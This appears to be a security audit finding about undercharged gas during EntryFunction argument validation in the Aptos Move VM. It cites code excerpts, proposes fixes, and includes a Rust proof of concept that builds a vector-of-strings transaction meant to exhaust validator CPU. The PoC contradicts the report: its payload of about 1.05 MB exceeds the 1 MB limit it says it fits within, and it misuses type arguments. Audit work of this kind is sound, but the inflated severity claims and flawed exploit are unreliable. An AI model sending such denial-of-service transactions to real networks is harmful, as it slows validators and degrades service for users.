# Audit Report

## Title
EntryFunction Argument Deserialization Gas Undercharging Enables Validator CPU Exhaustion

## Summary
EntryFunction argument validation performs expensive CPU operations (vector iteration, UTF-8 validation, BCS serialization) without charging proportional gas. Attackers can submit transactions with vectors of many small strings that appear cheap during mempool validation but consume excessive CPU resources during execution, causing validator slowdown.

## Finding Description

The vulnerability exists in the EntryFunction argument deserialization path, specifically in how gas is charged for argument validation work.

**Root Cause:**

1. **Mempool validation does NOT validate arguments.** The VMValidator implementation explicitly defers argument validation to execution time: [1](#0-0) 

2. **During execution, argument deserialization performs expensive operations without explicit gas charges.** The code acknowledges this limitation: [2](#0-1) 

3. **Vector iteration has no gas charges.** When processing vectors, the code iterates through all elements without charging gas for the iteration work: [3](#0-2) 

4. **String validation shortcut bypasses gas metering.** The string constructor shortcut performs UTF-8 validation and BCS serialization without charging gas: [4](#0-3) 

The comment at line 429 says "HACK mitigation of performance attack" but this mitigation only shortcuts the constructor call - it does NOT charge gas for the UTF-8 validation (line 466) or BCS serialization (line 467) work.

**Attack Vector:**

An attacker creates an EntryFunction transaction with a `vector<String>` argument containing many small strings:

1. Transaction structure: EntryFunction with argument type `vector<0x1::string::String>`
2. Argument contains 50,000 strings, each 20 bytes long
3. Total transaction size: ~1MB (within the transaction size limit) [5](#0-4) 

4. Only intrinsic gas is charged based on transaction size at execution entry: [6](#0-5) 

5. During argument validation, the work performed includes:
   - 50,000 vector element iterations (no gas charged)
   - 50,000 UTF-8 validations (no gas charged)  
   - 50,000 BCS serializations (no gas charged)
   - Memory allocations and copies

6. The computational complexity is O(N) where N is the number of strings, but gas charged is only O(S) where S is transaction size bytes.

**Why Existing Protections Don't Prevent This:**

The `max_invocations` limit (set to 10) is designed to limit recursive constructor calls, but strings explicitly bypass this protection: [7](#0-6) 

Strings don't count against the limit because they use the shortcut path, allowing unlimited strings in a vector.

## Impact Explanation

**Severity: High** - Validator node slowdowns

This vulnerability allows unprivileged attackers to cause validator CPU exhaustion by submitting transactions that:
- Pass mempool validation (no argument validation occurs)
- Consume minimal gas (based on transaction size)
- Force validators to perform extensive CPU work during execution (tens of thousands of iterations, validations, and serializations)

Each malicious transaction can consume significant CPU resources disproportionate to its gas cost. Multiple such transactions in a block can cause:
- Validator block processing delays
- Degraded network performance
- Potential consensus liveness issues if validators cannot keep up with block production

This breaks the critical invariant #9: "Resource Limits: All operations must respect gas, storage, and computational limits."

## Likelihood Explanation

**Likelihood: High**

- Attack requires no special permissions - any transaction sender can exploit this
- Transaction construction is straightforward - just create a vector of many strings
- Bypass of all existing protections (mempool validation, max_invocations limit)
- Cost to attacker is minimal (low gas fees based on transaction size)
- Impact is immediate and repeatable
- Can be combined with other transactions to amplify effect

The vulnerability is deterministic and guaranteed to cause excessive CPU consumption on all validators processing the block.

## Recommendation

**Immediate Fix:** Add explicit gas charges for argument validation operations.

In `recursively_construct_arg`, charge gas proportional to work done:

```rust
match ty {
    Vector(inner) => {
        let mut len = get_len(cursor)?;
        // CHARGE GAS for vector iteration overhead
        gas_meter.charge_execution(VECTOR_ITERATION_BASE + VECTOR_ITERATION_PER_ELEMENT * NumArgs::new(len as u64))?;
        serialize_uleb128(len, arg);
        while len > 0 {
            recursively_construct_arg(...)?;
            len -= 1;
        }
    },
    // ... rest of match
}
```

In `validate_and_construct` string shortcut path, charge gas for validation work:

```rust
if constructor.func_name.as_str() == "utf8" {
    let len = get_len(cursor)?;
    // CHARGE GAS for UTF-8 validation and serialization
    gas_meter.charge_execution(STRING_VALIDATION_BASE + STRING_VALIDATION_PER_BYTE * NumBytes::new(len as u64))?;
    // ... rest of string validation
}
```

**Long-term Fix:** 
- Implement comprehensive gas metering for all argument validation operations as suggested by the TODO comment
- Consider validating arguments during mempool admission to fail early
- Add configurable limits on vector sizes and nesting depth

## Proof of Concept

```rust
// PoC: Create malicious EntryFunction transaction
use aptos_types::transaction::{EntryFunction, TransactionPayload};
use move_core_types::{
    identifier::Identifier,
    language_storage::{ModuleId, TypeTag, StructTag},
    account_address::AccountAddress,
};

fn create_attack_transaction() -> TransactionPayload {
    // Target any entry function that accepts vector<String>
    let module = ModuleId::new(
        AccountAddress::from_hex_literal("0x1").unwrap(),
        Identifier::new("test").unwrap(),
    );
    let function = Identifier::new("process_strings").unwrap();
    
    // Create vector<String> type tag
    let string_type = TypeTag::Struct(Box::new(StructTag {
        address: AccountAddress::ONE,
        module: Identifier::new("string").unwrap(),
        name: Identifier::new("String").unwrap(),
        type_args: vec![],
    }));
    
    // Create 50,000 strings, each 20 bytes
    let mut args = vec![];
    let mut vector_arg = vec![];
    
    // Encode vector length (50,000 in ULEB128)
    vector_arg.extend_from_slice(&[0xD0, 0x86, 0x03]); // 50000 in ULEB128
    
    // Add 50,000 strings
    for _ in 0..50000 {
        // Each string: length (20) + 20 bytes of data
        vector_arg.push(20); // String length
        vector_arg.extend_from_slice(b"12345678901234567890"); // 20 bytes
    }
    
    args.push(vector_arg);
    
    TransactionPayload::EntryFunction(EntryFunction::new(
        module,
        function,
        vec![string_type],
        args,
    ))
}

// Expected behavior: 
// - Transaction size: ~1MB
// - Intrinsic gas: Based on 1MB (~150,000 gas units)
// - Actual CPU work: 50,000 iterations + 50,000 UTF-8 validations + 50,000 serializations
// - Each validator processing this transaction will experience significant CPU load
// - Multiple such transactions in a block can cause validator slowdown
```

**Notes:**

The vulnerability is confirmed by multiple pieces of evidence:
1. Explicit TODO comment acknowledging incomplete gas metering
2. "HACK mitigation of performance attack" comment showing awareness of the issue
3. No gas charges found in vector iteration or string validation paths
4. Mempool validation explicitly does NOT check arguments

This is a real exploitable vulnerability that breaks the gas metering invariant and enables validator DoS attacks.

### Citations

**File:** aptos-move/aptos-vm/src/aptos_vm.rs (L1040-1040)
```rust
        gas_meter.charge_intrinsic_gas_for_transaction(txn_data.transaction_size())?;
```

**File:** aptos-move/aptos-vm/src/aptos_vm.rs (L3161-3162)
```rust
    /// 1. Transaction arguments matches the main function's type signature.
    ///    We don't check this item for now and would execute the check at execution time.
```

**File:** aptos-move/aptos-vm/src/verifier/transaction_arg_validation.rs (L242-242)
```rust
    // Perhaps in a future we should do proper gas metering here
```

**File:** aptos-move/aptos-vm/src/verifier/transaction_arg_validation.rs (L345-364)
```rust
        Vector(inner) => {
            // get the vector length and iterate over each element
            let mut len = get_len(cursor)?;
            serialize_uleb128(len, arg);
            while len > 0 {
                recursively_construct_arg(
                    session,
                    loader,
                    gas_meter,
                    traversal_context,
                    inner,
                    allowed_structs,
                    cursor,
                    initial_cursor_len,
                    max_invocations,
                    arg,
                )?;
                len -= 1;
            }
        },
```

**File:** aptos-move/aptos-vm/src/verifier/transaction_arg_validation.rs (L429-432)
```rust
    // HACK mitigation of performance attack
    // To maintain compatibility with vector<string> or so on, we need to allow unlimited strings.
    // So we do not count the string constructor against the max_invocations, instead we
    // shortcut the string case to avoid the performance attack.
```

**File:** aptos-move/aptos-vm/src/verifier/transaction_arg_validation.rs (L433-468)
```rust
    if constructor.func_name.as_str() == "utf8" {
        let constructor_error = || {
            // A slight hack, to prevent additional piping of the feature flag through all
            // function calls. We know the feature is active when more structs then just strings are
            // allowed.
            let are_struct_constructors_enabled = allowed_structs.len() > 1;
            if are_struct_constructors_enabled {
                PartialVMError::new(StatusCode::ABORTED)
                    .with_sub_status(1)
                    .at_code_offset(FunctionDefinitionIndex::new(0), 0)
                    .finish(Location::Module(constructor.module_id.clone()))
                    .into_vm_status()
            } else {
                VMStatus::error(StatusCode::FAILED_TO_DESERIALIZE_ARGUMENT, None)
            }
        };
        // Short cut for the utf8 constructor, which is a special case.
        let len = get_len(cursor)?;
        if cursor
            .position()
            .checked_add(len as u64)
            .is_none_or(|l| l > initial_cursor_len as u64)
        {
            // We need to make sure we do not allocate more bytes than
            // needed.
            return Err(VMStatus::error(
                StatusCode::FAILED_TO_DESERIALIZE_ARGUMENT,
                Some("String argument is too long".to_string()),
            ));
        }

        let mut arg = vec![];
        read_n_bytes(len, cursor, &mut arg)?;
        std::str::from_utf8(&arg).map_err(|_| constructor_error())?;
        return bcs::to_bytes(&arg)
            .map_err(|_| VMStatus::error(StatusCode::FAILED_TO_DESERIALIZE_ARGUMENT, None));
```

**File:** aptos-move/aptos-vm/src/gas.rs (L26-26)
```rust
const MAXIMUM_APPROVED_TRANSACTION_SIZE_LEGACY: u64 = 1024 * 1024;
```
